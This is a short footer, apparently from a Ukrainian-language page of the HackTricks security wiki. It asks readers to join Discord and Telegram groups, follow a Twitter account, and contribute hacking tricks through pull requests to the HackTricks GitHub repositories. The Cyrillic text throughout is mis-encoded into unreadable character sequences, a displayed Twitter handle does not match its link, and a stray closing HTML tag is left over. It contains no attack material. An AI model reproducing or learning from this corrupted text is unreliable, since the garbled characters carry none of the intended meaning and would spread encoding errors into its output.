* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
